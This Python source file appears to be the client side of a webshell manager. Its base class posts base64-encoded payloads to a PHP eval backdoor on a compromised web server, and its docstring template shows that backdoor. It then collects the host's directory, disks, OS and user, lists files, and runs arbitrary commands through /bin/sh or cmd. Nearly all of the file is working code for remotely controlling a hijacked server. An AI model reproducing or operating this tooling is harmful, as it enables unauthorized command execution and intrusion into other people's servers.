from urllib.parse import unquote, quote
import urllib.request as ur
import re, os
from base64 import b64encode, b64decode
from .log import L


from .netlib import to

class Payload:
    """
    only need to set follow string:
        @template: like: "template = '{PASS}=@eval(base64_decode($_POST[action]));'"

        @init_payload:  return "->|pwd \t  disks \t os_info \t user |<-"

        @ls_payload: return "->|  item \n item \n item \n item  |<-"  for each item = 'file \t time \t size \t perm'

        @cmd_payload;

        @upload_payload;

        @download_payload;
    """

    template = None

    def __init__(self,target, passwd, random_agent=False, charset='utf-8', **headers):
        self.charset = charset
        res = to(target, agent=random_agent, headers=headers)

        if res.status_code == 200:
            self.headers = headers
            self.target = target

        else:
            raise Exception("connect error: code:%d" % res.status_code)
        self.passwd = passwd
        self.pwd = None
        self.template = self.template.format(PASS=passwd)
        self.headers['Content-type'] = "application/x-www-form-urlencoded"

        self.re_complier = re.compile(r'->\|([\w\W]+)\|<-')
        self.disks = ["/"]

    def post(self,payload):
        pay = self.template
        for k in payload:
            pay = pay + "&" +k +"="+ ur.quote(b64encode(payload[k].encode(self.charset)))
        try:
            response = to(self.target, headers=self.headers, data=pay, method='post').content
            content = response.decode(self.charset, 'ignore')
            return self.re_complier.findall(content)[0]

        except IndexError:
            # L(payload, color='red')
            # L(response, color='white',on='on_red')
            # raise Exception("this payload error , no res got : ")
            return ''

        except UnicodeDecodeError as e:
            L(response,color='yellow')
            raise e
        


    def init(self):
        self.pwd, dir_tree, os_info, cur_user =  self.post(self.init_payload).split("\t")
        self.os_info = os_info
        if 'indows' in os_info:
            self.os = 'win'
            self.delta =  '/'
        elif 'linux' in os_info:
            self.os = 'linux'
            self.delta =  '/'
        elif 'unix' in os_info:
            self.os = 'unix'
            self.delta =  '/'
        else:
            self.os = os_info
            self.delta = '/'

        if not dir_tree.startswith("/"):
            self.disks = [ i+":" for i in dir_tree.split(":") if i]
        self.user = cur_user

    def ls(self, path=''):
        if not path:
            path = self.pwd
        p = self.ls_payload
        if path.startswith(self.pwd):
            p['z1'] = path
        else:
            if self.pwd.endswith("/") or self.pwd.endswith("\\"):
                p['z1'] = self.pwd + path
            else:
                p['z1'] = self.pwd + self.delta + path
        dirs = [ i for i in self.post(p).strip().split("\n") if not i.startswith("./") and not i.startswith("../")]
        return Files(self.pwd,*dirs)

    def cd(self, path):
        if path == "..":
            if self.pwd.endswith(self.delta):
                self.pwd = os.path.dirname(os.path.dirname(self.pwd))
            else:
                self.pwd = os.path.dirname(self.pwd)
            return
        elif path == '.':
            return
        self.pwd = os.path.join(self.pwd, path)
        # self.pwd = self.pwd + self.delta + path

    def cmd(self,comand):
        c = '/bin/sh'
        shell = "cd  \"" + self.pwd + "\";" + comand
        if self.os == 'win':
            c = 'cmd'
            shell = "cd  /d \"" + self.pwd + "\"&" + comand
        p = self.cmd_payload

        p['z1'] = c
        p['z2'] = shell
        return self.post(p).strip()

    def upload(self, path, file):
        pass
        # raise NotImplementedError()

    def download(self, path):
        pass
        # raise NotImplementedError()


class File:
    tmp_db = dict()

    def __init__(self, one):
        if isinstance(one, dict):
            self.name = one['name']
            self.time = one['time']
            self.size = one['size']
            self.perm = one['perm']
        elif isinstance(one, str):
            val = one.split("\t")
            if len(val) == 4:
                self.name ,self.time ,self.size ,self.perm  = val
            else:
                self.name = val[0]
                self.time ,self.size ,self.perm  = '',0,0

        self.is_dir = False
        if self.name.endswith("/") or self.name.endswith("\\"):
            self.is_dir = True

        File.tmp_db[self.name] = self

    def __repr__(self):
        return self.name

    def __len__(self):
        return len(self.name)

    @staticmethod
    def got(name):
        return File.tmp_db.get(name)


class Files:
    tmp_db = dict()

    def __init__(self,cur, *dirs):
        self.cur = cur
        self.len = len(dirs)
        self.fs = [File(f) for f in dirs  ]
        Files.tmp_db[cur] = self.fs

    @staticmethod
    def got(self,cur):
        return Files.tmp_db.get(cur)


    def __iter__(self):
        for f in self.fs:
            yield f

    def __getitem__(self,k):
        return self.fs[k]

    def __contains__(self, item):
        
        for f in self:
            if isinstance(item, File):
                return item == f
            elif isinstance(item, str):
                if f.name == item:
                    return True
        return False

    def __repr__(self):
        o = super().__repr__()
        return self.cur + "|" + str(self.len) + "|" + o